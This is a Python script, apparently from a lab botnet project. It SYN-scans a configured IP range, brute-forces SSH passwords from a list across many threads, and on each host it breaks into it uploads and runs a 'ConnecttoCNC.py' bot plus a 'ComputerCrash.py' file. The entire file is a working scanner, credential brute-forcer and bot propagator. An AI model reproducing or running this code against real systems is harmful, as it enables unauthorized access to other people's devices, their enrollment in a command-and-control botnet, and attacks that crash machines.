from scapy.all import *
import paramiko
import threading
import os

paramiko.util.log_to_file("connections.log")
clientslist = list()
threadpool = list()
connectresults = list()
successclients = list()
listofopenipaddresses = list()
mutex = threading.Lock()
searchdone = False

def tryandconnect(ipaddresses,passwordsource,successfullyconnectedclients):
	"""
	This function will connect to Iot VM and install a script which will connect back to the CNC server
	It will install other content as well 
	"""
	try:
		client = paramiko.SSHClient()
		client.load_system_host_keys()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		client.connect(ipaddresses,password=passwordsource)
		client.exec_command('rm /root/ConnecttoCNC.py')
		client.exec_command('touch /root/ConnecttoCNC.py')
		client.exec_command('rm /root/Config.txt')
		client.exec_command('touch Config.txt')
		client.exec_command('rm /root/ComputerCrash.py')
		client.exec_command('touch /root/ComputerCrash.py')
		client.exec_command('rm /root/content.txt')
		client.exec_command('touch /root/content.txt')
		sftp = client.open_sftp()
		sftp.put(os.getcwd() + '/ConnecttoCNC.py','/root/ConnecttoCNC.py')
		sftp.put(os.getcwd() + '/Config.txt', '/root/Config.txt')
		sftp.put(os.getcwd() + '/ComputerCrash.py','/root/ComputerCrash.py')
		sftp.put(os.getcwd() + '/content.txt', '/root/content.txt')
		successfullyconnectedclients.append(client)
		stdin,stdout,stderr = client.exec_command('python /root/ConnecttoCNC.py')
	except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException,paramiko.ssh_exception.NoValidConnectionsError) as e:
		return None


def generaterangeofipstoconnect(rangestr):
	"""
	This function generates a list of random IP addresses
	"""
	listofips = []
	for index in range(255):
		listofips.append(rangestr + '.' + str(index))

	print(listofips)

	return listofips

def findtargets():
	"""
	This function will perform a syn scan and find possible Iot VM hosts to connect to
	"""
	global listofopenipaddresses
	global mutex
	for index in range(107,115):
		ipaddress = IP_RANGE + '.' + str(index)
		print('Current IP check = ', ipaddress)
		if ipaddress != TARGET:
			answer = sr1(IP(dst=ipaddress)/TCP(dport=80,flags="S"),timeout=2)
			if answer != None:
				mutex.acquire()
				listofopenipaddresses.append(ipaddress)
				mutex.release()

	global searchdone
	searchdone = True

IP_RANGE = ' '
TARGET = ' '
print("Please choose an option (1 or 2)")
print("1 = Search for IP addresses within a range \n2 = Manually enter bots ip addresses")
input_choice = raw_input()

with open('Config.txt', 'r') as file:
	content = file.readlines()
	line = content[2]
	IP_RANGE = line[14:]
	IP_RANGE = IP_RANGE.rstrip()
	line = content[0]
	TARGET = line[16:]
	TARGET = TARGET.rstrip()


if int(input_choice) == 1:
	searchthread = threading.Thread(target=findtargets)
	searchthread.start()

if int(input_choice) == 2:
	getnumberofbots = raw_input("How many bots would you like to connect to: ")

	for index in range(getnumberofbots):
		botip = raw_input("Enter the ip address of bot {}".format(index + 1))
		listofopenipaddresses.append(botip)

if int(input_choice) == 1:
	while searchdone == False:
		mutex.acquire()
		for index in range(len(listofopenipaddresses)):
			with open("Passwords.txt",'r') as file:
				content = file.readlines()
				listofpasswords = [parsefile.strip() for parsefile in content]
				for row in listofpasswords:
					t = threading.Thread(target=tryandconnect, args = (listofopenipaddresses[index],row,successclients))
					threadpool.append(t)
					t.start()

				for threadresult in threadpool:
					threadresult.join()

		listofopenipaddresses = []
		mutex.release()

else:
	mutex.acquire()
	for index in range(len(listofopenipaddresses)):
		with open("Passwords.txt",'r') as file:
			content = file.readlines()
			listofpasswords = [parsefile.strip() for parsefile in content]
			for row in listofpasswords:
				t = threading.Thread(target=tryandconnect, args = (listofopenipaddresses[index],row,successclients))
				threadpool.append(t)
				t.start()

			for threadresult in threadpool:
				threadresult.join()
	mutex.release()